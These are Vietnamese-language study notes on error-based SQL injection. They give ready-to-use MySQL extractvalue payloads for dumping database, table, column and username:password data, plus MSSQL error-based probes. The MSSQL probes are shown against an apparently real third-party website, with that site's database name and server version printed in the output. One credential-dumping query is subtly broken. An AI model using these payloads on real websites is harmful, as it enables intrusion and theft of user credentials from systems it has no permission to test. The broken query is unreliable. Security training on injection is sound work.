**1. Error Based Injection using Extractvalue:
----------------------------------------------

Với task trước ta sử dụng `Union based injections` để khai thác lỗi, nhưng với các web application hiện nay đã xử lý được lỗi trên bằng cách check input và không show gì ra output nữa.

Vì vậy có thể sử dụng các khác: `Extractvalue` để có thể show columns

Thông thường ta dùng: `www.vuln-web.com/index.php?view=-35" union select 1,2,3,4,5--` thì có thể dùngcùng lúc 2 truy vấn hoặc nhiều hơn

`select path from pages where view="<our_input_here>" limit 1,1;`

- Ở đây sử dụng kết hợp đồng thời lệnh thêm dòng mới và câu truy vấn để đưa input vào: `0x0a`=`New Line`

`www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(**OUR QUERY HERE**)))--`

Với lệnh này chúng ta có thể xem được tên của database:

`www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--`

Bắt lấy table: `select table_name from information_schema.tables where table_schema=database() limit 0,1`

hay column :`select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1`

Khi đó với truy vấn trên sẽ trả về cho chúng ta biết được tên của các cột: giả sử trả về 3 cột id, username,password

Đếm số cột `select count(username) from users`

Xem thông tin cột: `select count(username,0x3a,password) from users limit 0,1`

- Mấu chôt của lỗi này là ở việc thay vì dùng truy vấn `UNION` như trước chúng ta thay nó bằng hàm `ExtractValue('xmldatahere', 'xpathqueryhere')` để khai thác lỗi này

**2. MSSQL Error Based Injection:
---------------------------------

Lỗi này xuất hiện khi chúng ta dùng các comment:

Comment		Name

--		:	MySQL Linux Style
--+		:	MySQL Windows Style
#		:	Hash (URL encode while use)
--+-	:	SQL Comment
;%00	:	Null Byte
`		:	Backtick

MySQL Error Style: `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1`

MSSQL ASPX Error: `Server Error in '/' Application`

MSAccess (Apache PHP): `Fatal error: Uncaught exception 'com_exception' with message Source: Microsoft JET Database Engine`

Oracle Error: `ORA-00933: SQL command not properly ended`

MS SQL Server: Error: `Microsoft SQL Native Client error %u201880040e14%u2019. Unclosed quotation mark after the character string`

- Kiểm tra số cột hoạt động bằng các lệnh comment kết hợp order:

ví dụ: 

```sh
http://www.timescanindia.in/Product.aspx?Id=7--
working fine.
http://www.timescanindia.in/Product.aspx?Id=7 order by 1--
No Error
http://www.timescanindia.in/Product.aspx?Id=7 order by 100--
Here comes the error : The ORDER BY position number 100 is out of range of the number of items in the select list
```

- Lấy tên cột :

```sh
http://www.timescanindia.in/Product.aspx?Id=7 and 1=db_name()--
Boom we got the error, and yeah the output also contains database name alongwith it.
Conversion failed when converting the nvarchar value 'timescanindia' to data type int
```

- Kiểm tra version: 

```sh
http://www.timescanindia.in/Product.aspx?Id=7 and @@version=1--
Again we got an error as well as the output with the error: 
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2012 (SP1) - 11.0.3000.0 (X64)
Oct 19 2012 13:38:57
Copyright (c) Microsoft Corporation
Web Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)
' to data type int..
```

- Nhận thấy ở đây sử dụng MSSQL làm cơ sở dữ liệu: trang này cung cấp cách để khai thác MSSQL

http://securityidiots.com/Web-Pentest/SQL-Injection/mssql/mssql-dios.html


**3. Error Based SQL Injection Using EXP:
-----------------------------------------

- Kiểm tra web đang sử dụng hệ quản trị cơ sở gì để khai thác:

http://securityidiots.com/Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html
